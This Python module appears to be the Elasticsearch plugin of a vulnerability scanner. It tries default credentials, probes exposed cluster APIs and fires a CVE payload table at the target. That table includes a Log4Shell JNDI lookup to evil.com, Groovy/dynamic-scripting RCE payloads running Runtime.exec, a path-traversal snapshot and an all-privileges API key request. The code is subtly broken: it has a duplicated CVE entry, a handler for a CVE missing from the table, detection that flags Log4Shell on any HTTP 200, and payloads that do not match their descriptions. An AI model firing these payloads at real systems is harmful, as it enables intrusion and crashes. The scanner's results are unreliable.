import httpx
import asyncio
import json
import re

# A list of sensitive paths that should not be publicly accessible
SENSITIVE_PATHS = [
    "/_cat/nodes", "/_nodes", "/_nodes/stats", "/_cluster/stats", "/_cluster/health",
    "/_cat/indices", "/_cat/aliases", "/_cat/shards", "/_cluster/state",
    "/_security/user", "/_security/role", "/_security/privilege",
    "/_cat/tasks", "/_tasks", "/_cluster/pending_tasks", "/_cat/pending_tasks",
]

# Comprehensive CVE database with version ranges and payloads
CVE_DATABASE = {
    "CVE-2024-23450": {
        "description": "Document processing in deeply nested pipeline causes node crash", 
        "severity": "MEDIUM",
        "affected_versions": [">=7.0.0,<7.17.19", ">=8.0.0,<8.13.0"],
        "payload": {
            "path": "/_ingest/pipeline/test",
            "method": "PUT",
            "data": {
                "processors": [
                    {
                        "foreach": {
                            "field": "nested",
                            "processor": {
                                "foreach": {
                                    "field": "_ingest._value.nested2",
                                    "processor": {
                                        "set": {
                                            "field": "_ingest._value.processed",
                                            "value": True
                                        }
                                    }
                                }
                            }
                        }
                    }
                ]
            }
        }
    },
    "CVE-2024-43709": {
        "description": "Allocation of resources without limits or throttling leads to crash",
        "severity": "HIGH", 
        "affected_versions": [">=7.17.0,<7.17.21", ">=8.0.0,<8.13.3"],
        "payload": {
            "path": "/_sql",
            "method": "POST",
            "data": {
                "query": "SELECT * FROM library ORDER BY page_count DESC"
            }
        }
    },
    "CVE-2024-23450": {
        "description": "Document processing in deeply nested pipeline causes node crash", 
        "severity": "MEDIUM",
        "affected_versions": [">=7.0.0,<7.17.19", ">=8.0.0,<8.13.0"],
        "payload": {
            "path": "/_ingest/pipeline/test",
            "method": "PUT",
            "data": {
                "processors": [
                    {
                        "foreach": {
                            "field": "nested",
                            "processor": {
                                "foreach": {
                                    "field": "_ingest._value.nested2",
                                    "processor": {
                                        "set": {
                                            "field": "_ingest._value.processed",
                                            "value": True
                                        }
                                    }
                                }
                            }
                        }
                    }
                ]
            }
        }
    },
    "CVE-2023-31419": {
        "description": "StackOverflow vulnerability in _search API",
        "severity": "MEDIUM",
        "affected_versions": [">=7.0.0,<7.17.10", ">=8.0.0,<8.7.1"],
        "payload": {
            "path": "/_search",
            "method": "POST",
            "data": {
                "query": {
                    "bool": {
                        "must": [
                            {
                                "nested": {
                                    "path": "user",
                                    "query": {
                                        "bool": {
                                            "must": [
                                                {"match": {"user.first": "john"}},
                                                {"match": {"user.last": "doe"}}
                                            ]
                                        }
                                    }
                                }
                            }
                        ]
                    }
                }
            }
        }
    },
    "CVE-2021-44228": {
        "description": "Log4Shell - Remote Code Execution in Log4j",
        "severity": "CRITICAL",
        "affected_versions": [">=6.7.0,<6.8.22", ">=7.0.0,<7.16.2"],
        "payload": {
            "path": "/_search",
            "method": "POST",
            "data": {
                "query": {
                    "match": {
                        "message": "${jndi:ldap://evil.com/a}"
                    }
                }
            }
        }
    },
    "CVE-2021-22145": {
        "description": "Elasticsearch Arbitrary Code Execution",
        "severity": "CRITICAL",
        "affected_versions": [">=7.12.0,<7.13.3", ">=7.14.0,<7.14.1"],
        "payload": {
            "path": "/_snapshot/test",
            "method": "PUT",
            "data": {
                "type": "fs",
                "settings": {
                    "location": "/tmp/test"
                }
            }
        }
    },
    "CVE-2020-7009": {
        "description": "Privilege escalation via API keys",
        "severity": "HIGH",
        "affected_versions": [">=6.7.0,<6.8.8", ">=7.0.0,<7.6.2"],
        "payload": {
            "path": "/_security/api_key",
            "method": "POST",
            "data": {
                "name": "test-key",
                "role_descriptors": {
                    "role-a": {
                        "cluster": ["all"],
                        "index": [
                            {
                                "names": ["*"],
                                "privileges": ["all"]
                            }
                        ]
                    }
                }
            }
        }
    },
    "CVE-2019-7611": {
        "description": "Username disclosure in API Key service",
        "severity": "MEDIUM", 
        "affected_versions": [">=6.7.0,<6.8.3", ">=7.0.0,<7.3.2"],
        "payload": {
            "path": "/_security/api_key",
            "method": "GET"
        }
    },
    "CVE-2015-5531": {
        "description": "Directory traversal via snapshot API",
        "severity": "HIGH",
        "affected_versions": ["<1.6.1"],
        "payload": {
            "path": "/_snapshot/test",
            "method": "PUT",
            "data": {
                "type": "fs",
                "settings": {
                    "location": "../../../etc/"
                }
            }
        }
    },
    "CVE-2015-1427": {
        "description": "Groovy Sandbox Bypass - Remote Code Execution",
        "severity": "CRITICAL",
        "affected_versions": ["<1.3.8", ">=1.4.0,<1.4.3"],
        "payload": {
            "path": "/_search",
            "method": "POST",
            "data": {
                "size": 1,
                "script_fields": {
                    "test": {
                        "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"
                    }
                }
            }
        }
    },
    "CVE-2014-6439": {
        "description": "Cross-site scripting (XSS) in CORS functionality",
        "severity": "MEDIUM",
        "affected_versions": ["<1.4.0"],
        "payload": {
            "path": "/_search",
            "method": "GET",
            "params": {"callback": "alert(1)//"}
        }
    },
    "CVE-2014-3120": {
        "description": "Dynamic Scripting Remote Code Execution",
        "severity": "CRITICAL", 
        "affected_versions": ["<1.2.0"],
        "payload": {
            "path": "/_search",
            "method": "POST",
            "data": {
                "size": 1,
                "query": {
                    "filtered": {
                        "query": {"match_all": {}}
                    }
                },
                "script_fields": {
                    "test": {
                        "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")"
                    }
                }
            }
        }
    }
}

# Version-based vulnerability database (non-CVE security issues)
VERSION_VULNERABILITIES = {
    "default_config_issues": {
        "description": "Default configuration vulnerabilities",
        "checks": [
            {
                "versions": ["<2.0.0"],
                "issue": "Dynamic scripting enabled by default",
                "risk": "HIGH",
                "details": "Dynamic scripting allows arbitrary code execution"
            },
            {
                "versions": ["<5.0.0"],
                "issue": "No authentication by default",
                "risk": "CRITICAL", 
                "details": "Cluster accessible without authentication"
            },
            {
                "versions": ["<6.8.0"],
                "issue": "Weak default SSL configuration",
                "risk": "MEDIUM",
                "details": "SSL/TLS not enforced by default"
            }
        ]
    },
    "known_weaknesses": {
        "description": "Known security weaknesses by version",
        "checks": [
            {
                "versions": [">=1.0.0,<2.4.0"],
                "issue": "Weak Groovy sandbox",
                "risk": "HIGH",
                "details": "Groovy scripting sandbox can be bypassed"
            },
            {
                "versions": [">=2.0.0,<5.6.0"],
                "issue": "Insecure deserialization",
                "risk": "HIGH", 
                "details": "Java deserialization vulnerabilities"
            },
            {
                "versions": [">=6.0.0,<6.8.15"],
                "issue": "Insufficient access controls",
                "risk": "MEDIUM",
                "details": "Missing granular permission controls"
            }
        ]
    }
}

async def get_elasticsearch_version(target_url):
    """Extract Elasticsearch version from multiple API endpoints."""
    version_info = {}
    
    # Try main root endpoint first
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(target_url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                version_info['number'] = data.get('version', {}).get('number')
                version_info['build_hash'] = data.get('version', {}).get('build_hash')
                version_info['build_date'] = data.get('version', {}).get('build_timestamp')
                version_info['lucene_version'] = data.get('version', {}).get('lucene_version')
                version_info['cluster_name'] = data.get('cluster_name')
                return version_info
    except (httpx.RequestError, httpx.ConnectError, json.JSONDecodeError):
        pass
    
    # Try alternative endpoints for version detection
    alternative_endpoints = [
        "/_nodes",
        "/_cluster/health",
        "/_cat/nodes?v&h=version"
    ]
    
    for endpoint in alternative_endpoints:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(f"{target_url}{endpoint}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if endpoint == "/_nodes":
                        nodes = data.get('nodes', {})
                        if nodes:
                            first_node = next(iter(nodes.values()))
                            version_info['number'] = first_node.get('version')
                            return version_info
                    elif endpoint == "/_cluster/health":
                        # Sometimes version info is in headers
                        server_header = response.headers.get('server', '')
                        if 'Elasticsearch' in server_header:
                            version_match = re.search(r'Elasticsearch/(\d+\.\d+\.\d+)', server_header)
                            if version_match:
                                version_info['number'] = version_match.group(1)
                                return version_info
        except (httpx.RequestError, httpx.ConnectError, json.JSONDecodeError):
            continue
    
    return version_info if version_info else None

def parse_version(version_string):
    """Parse version string into comparable tuple."""
    try:
        # Remove any non-numeric suffixes and split by dots
        clean_version = re.match(r'^(\d+(?:\.\d+)*)', version_string.strip())
        if not clean_version:
            return (0,)
        
        parts = clean_version.group(1).split('.')
        return tuple(int(part) for part in parts)
    except (ValueError, AttributeError):
        return (0,)

def compare_versions(version1, version2):
    """Compare two version strings. Returns -1, 0, or 1."""
    v1 = parse_version(version1)
    v2 = parse_version(version2)
    
    # Pad shorter version with zeros
    max_len = max(len(v1), len(v2))
    v1 = v1 + (0,) * (max_len - len(v1))
    v2 = v2 + (0,) * (max_len - len(v2))
    
    if v1 < v2:
        return -1
    elif v1 > v2:
        return 1
    else:
        return 0

def is_version_affected(current_version, version_ranges):
    """Check if current version falls within affected version ranges."""
    if not current_version:
        return False
    
    try:
        for version_range in version_ranges:
            if version_range.startswith('<'):
                max_version = version_range[1:]
                if compare_versions(current_version, max_version) < 0:
                    return True
            elif '>=' in version_range and '<' in version_range:
                # Handle ranges like ">=7.12.0,<7.13.3"
                parts = version_range.split(',')
                min_version = parts[0][2:]  # Remove >=
                max_version = parts[1][1:]  # Remove <
                if (compare_versions(current_version, min_version) >= 0 and 
                    compare_versions(current_version, max_version) < 0):
                    return True
    except Exception:
        return False
    return False

async def test_cve_payload(target_url, cve_id, cve_data):
    """Test a specific CVE payload against the target."""
    payload = cve_data["payload"]
    test_url = f"{target_url}{payload['path']}"
    
    try:
        async with httpx.AsyncClient() as client:
            response = None
            
            if payload["method"] == "GET":
                params = payload.get("params", {})
                response = await client.get(test_url, params=params, timeout=5)
            elif payload["method"] == "POST":
                response = await client.post(test_url, json=payload.get("data", {}), timeout=5)
            elif payload["method"] == "PUT":
                response = await client.put(test_url, json=payload.get("data", {}), timeout=5)
            else:
                return None
            
            # Check for indicators of successful exploitation
            if response.status_code in [200, 201, 202]:
                response_text = response.text.lower()
                
                # CVE-specific detection logic
                if cve_id in ["CVE-2014-3120", "CVE-2015-1427"]:
                    if any(indicator in response_text for indicator in ["error", "exception", "stacktrace"]):
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": f"Script execution attempt triggered server response. Potential RCE vulnerability."
                        }
                
                elif cve_id == "CVE-2021-22145":
                    if "acknowledged" in response_text:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Snapshot creation successful, indicating potential arbitrary code execution vulnerability."
                        }
                
                elif cve_id == "CVE-2021-44228":  # Log4Shell
                    if response.status_code == 200:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Log4Shell payload processed. Critical remote code execution vulnerability."
                        }
                
                elif cve_id in ["CVE-2020-7009", "CVE-2019-7611"]:  # API key vulnerabilities
                    if "api_keys" in response_text or "access_token" in response_text:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "API key endpoint accessible. Potential privilege escalation vulnerability."
                        }
                
                elif cve_id in ["CVE-2024-43709", "CVE-2024-23450", "CVE-2023-31419"]:  # DoS vulnerabilities
                    if any(indicator in response_text for indicator in ["error", "exception", "out_of_memory"]):
                        return {
                            "status": "VULNERABLE", 
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Payload triggered error response. Potential denial of service vulnerability."
                        }
                
                elif cve_id == "CVE-2025-54988":  # XXE vulnerability
                    if "acknowledged" in response_text:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Pipeline creation successful. Potential XXE vulnerability in document processing."
                        }
                
                elif cve_id == "CVE-2014-6439":  # XSS vulnerability
                    if "callback" in str(response.url):
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "JSONP callback parameter processed. Cross-site scripting vulnerability."
                        }
                
                elif cve_id == "CVE-2015-5531":  # Directory traversal
                    if "acknowledged" in response_text:
                        return {
                            "status": "VULNERABLE",
                            "vulnerability": f"{cve_id} - {cve_data['description']}",
                            "target": test_url,
                            "details": "Directory traversal path accepted. Potential file system access vulnerability."
                        }
                        
            # Check for error responses that might indicate vulnerabilities
            elif response.status_code in [400, 500]:
                if cve_id in ["CVE-2024-43709", "CVE-2024-23450", "CVE-2023-31419"]:
                    return {
                        "status": "POTENTIAL",
                        "vulnerability": f"{cve_id} - {cve_data['description']}",
                        "target": test_url,
                        "details": f"Server error response (HTTP {response.status_code}) may indicate vulnerability presence."
                    }
                    
    except (httpx.RequestError, httpx.ConnectError, httpx.TimeoutException):
        pass
    except Exception as e:
        # Capture unexpected exceptions that might indicate vulnerabilities
        if cve_id in ["CVE-2024-43709", "CVE-2024-23450", "CVE-2023-31419"]:
            return {
                "status": "POTENTIAL",
                "vulnerability": f"{cve_id} - {cve_data['description']}",
                "target": test_url,
                "details": f"Exception occurred during testing: {str(e)[:100]}. May indicate DoS vulnerability."
            }
    
    return None

async def check_version_vulnerabilities(target_url, version_info):
    """Check for version-specific vulnerabilities and misconfigurations."""
    vulnerabilities = []
    
    if not version_info or not version_info.get('number'):
        return vulnerabilities
        
    version_number = version_info['number']
    
    for category_data in VERSION_VULNERABILITIES.values():
        for check in category_data['checks']:
            if is_version_affected(version_number, check['versions']):
                vulnerabilities.append({
                    "status": "VULNERABLE",
                    "vulnerability": f"Version Vulnerability - {check['issue']}",
                    "target": target_url,
                    "details": f"Version {version_number} affected by {check['issue']}. Risk: {check['risk']}. {check['details']}"
                })
    
    return vulnerabilities

async def check_cve_vulnerabilities(target_url):
    """Check for known CVE vulnerabilities based on version and payload testing."""
    vulnerabilities = []
    
    # Get comprehensive version info
    version_info = await get_elasticsearch_version(target_url)
    version_number = version_info.get('number') if version_info else None
    
    # Check version-based vulnerabilities first
    if version_info:
        version_vulns = await check_version_vulnerabilities(target_url, version_info)
        vulnerabilities.extend(version_vulns)
    
    # Check CVE vulnerabilities
    for cve_id, cve_data in CVE_DATABASE.items():
        if version_number and is_version_affected(version_number, cve_data["affected_versions"]):
            # Version is affected, test with payload
            result = await test_cve_payload(target_url, cve_id, cve_data)
            if result:
                # Add severity information
                result['severity'] = cve_data.get('severity', 'UNKNOWN')
                vulnerabilities.append(result)
            else:
                # Version is affected but payload didn't confirm
                vulnerabilities.append({
                    "status": "POTENTIAL",
                    "vulnerability": f"{cve_id} - {cve_data['description']}",
                    "target": target_url,
                    "severity": cve_data.get('severity', 'UNKNOWN'),
                    "details": f"Version {version_number} is affected by this CVE (severity: {cve_data.get('severity', 'UNKNOWN')}) but payload test was inconclusive. Build: {version_info.get('build_hash', 'N/A')}"
                })
    
    return vulnerabilities

async def check_unauthenticated_access(target_url):
    """Checks for unauthenticated access and grabs version info."""
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(target_url, timeout=5)
            if response.status_code == 200 and 'You Know, for Search' in response.text:
                version_info = response.json().get('version', {}).get('number', 'N/A')
                return {
                    "status": "VULNERABLE",
                    "vulnerability": "Elasticsearch Unauthenticated Access",
                    "target": target_url,
                    "details": f"The Elasticsearch API is accessible without authentication. Version: {version_info}. Full cluster data could be at risk."
                }
    except (httpx.RequestError, httpx.ConnectError):
        pass
    except Exception: # Catches JSON parsing errors etc.
        pass
    return None

async def check_default_credentials(target_url):
    """Checks for common default credentials."""
    creds = [
        ('elastic', 'changeme'),
        ('admin', 'elasticadmin')
    ]
    try:
        async with httpx.AsyncClient() as client:
            for user, password in creds:
                response = await client.get(target_url, auth=(user, password), timeout=5)
                if response.status_code == 200 and 'You Know, for Search' in response.text:
                    return {
                        "status": "VULNERABLE",
                        "vulnerability": "Elasticsearch Default Credentials",
                        "target": target_url,
                        "details": f"Successfully authenticated with default credentials: {user}:{password}"
                    }
    except (httpx.RequestError, httpx.ConnectError):
        pass
    return None

async def check_sensitive_paths(target_url):
    """Checks for exposure of sensitive API endpoints."""
    accessible_paths = []
    
    async def probe_path(client, path):
        try:
            response = await client.get(f"{target_url}{path}", timeout=3)
            if response.status_code == 200:
                return path
        except (httpx.RequestError, httpx.ConnectError):
            pass
        return None

    try:
        async with httpx.AsyncClient() as client:
            tasks = [probe_path(client, path) for path in SENSITIVE_PATHS]
            results = await asyncio.gather(*tasks)
            accessible_paths = [res for res in results if res is not None]

        if accessible_paths:
            return {
                "status": "VULNERABLE",
                "vulnerability": "Elasticsearch Sensitive Information Exposure",
                "target": target_url,
                "details": f"Found {len(accessible_paths)} sensitive endpoints exposed without authentication. Exposed paths: {', '.join(accessible_paths)}"
            }
    except Exception:
        pass # Should not happen, but as a safeguard
    return None


async def run_scans(ip, port):
    """Runs all defined Elasticsearch scans against a target."""
    target_url = f"http://{ip}:{port}"
    print(f"  -> Running Elasticsearch scans on {target_url}")
    results = []
    
    # Get version information first
    version_info = await get_elasticsearch_version(target_url)
    service_version = version_info.get('number', 'Unknown') if version_info else 'Unknown'
    
    # Run checks concurrently
    tasks = [
        check_unauthenticated_access(target_url),
        check_default_credentials(target_url),
        check_sensitive_paths(target_url)
    ]
    check_results = await asyncio.gather(*tasks)
    
    for res in check_results:
        if res:
            # Add module, version, server and port info
            res['module'] = 'Elasticsearch'
            res['service_version'] = service_version
            res['server'] = ip
            res['port'] = port
            results.append(res)
    
    # Run CVE checks
    cve_results = await check_cve_vulnerabilities(target_url)
    for cve_result in cve_results:
        cve_result['module'] = 'Elasticsearch'
        cve_result['service_version'] = service_version
        cve_result['server'] = ip
        cve_result['port'] = port
    results.extend(cve_results)
            
    return results

